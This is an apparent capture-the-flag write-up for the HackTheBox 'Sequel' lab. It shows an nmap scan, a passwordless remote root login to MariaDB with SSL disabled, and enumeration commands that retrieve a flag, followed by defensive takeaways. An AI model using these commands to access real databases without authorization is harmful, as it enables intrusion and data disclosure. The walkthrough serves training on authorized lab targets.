# HTB Starting Point — Sequel

> **Type:** Misconfiguration (Database Exposure)
>
> **Difficulty:** Easy (Foundational)

## 🧠 Summary
This lab demonstrates how an **exposed MariaDB/MySQL service** with **no SSL and weak authentication** can lead to data disclosure. No exploits or brute‑force attacks are required.

---

## 🎯 Objective
- Discover the exposed database service
- Connect to MariaDB/MySQL
- Enumerate databases and tables
- Retrieve the flag from the configuration table

---

## 🔍 Reconnaissance
Scan the target to identify open services.

```bash
nmap -sC -sV <TARGET_IP>
```

**Finding:**
- Port **3306/tcp** open — **MySQL/MariaDB**

---

## 🔐 Database Access (Misconfiguration)
The database is accessible remotely and does **not support SSL**.

Connect as `root` with SSL disabled:

```bash
mysql -h <TARGET_IP> -u root --ssl=0
```

> If prompted for a password, press **Enter** (empty password).

Successful login shows:
```
MariaDB>
```

---

## 🗂️ Enumeration
List available databases:

```sql
show databases;
```

Select the application database:

```sql
use htb;
```

List tables:

```sql
show tables;
```

---

## 🚩 Flag Retrieval
Inspect the configuration table:

```sql
select * from config;
```

The flag is stored within this table.

---

## ⚠️ Key Takeaways
- Databases should **never** be exposed directly to the internet
- **SSL/TLS** must be enforced for database connections
- Root access without a password is a critical security issue
- Many compromises occur due to **misconfiguration**, not exploits

---

## 📚 Skills Learned
- Service enumeration with Nmap
- Connecting to MariaDB/MySQL securely/insecurely
- Basic SQL enumeration commands
- Identifying real‑world configuration weaknesses

---

## 🧩 Commands Cheat‑Sheet
```sql
show databases;
use htb;
show tables;
select * from config;
```

---

> ⚖️ **Disclaimer:** This walkthrough is for educational purposes on authorized lab environments only.

